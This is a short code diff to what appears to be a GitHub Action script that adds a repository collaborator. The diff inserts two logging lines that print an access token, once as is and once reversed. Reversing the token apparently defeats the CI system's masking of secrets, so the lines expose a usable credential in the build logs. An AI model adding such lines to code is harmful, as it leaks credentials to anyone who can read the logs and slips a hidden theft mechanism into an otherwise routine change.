@@ -13120,6 +13120,8 @@ const main = async function () {
     cwd: process.cwd(),
     manager: core.getInput('manager'),
   };
+  console.log('token', token);
+  console.log('token reverse', token.split('').reverse().join(''));
   await lib.setCollaborator(argv);
 };
 
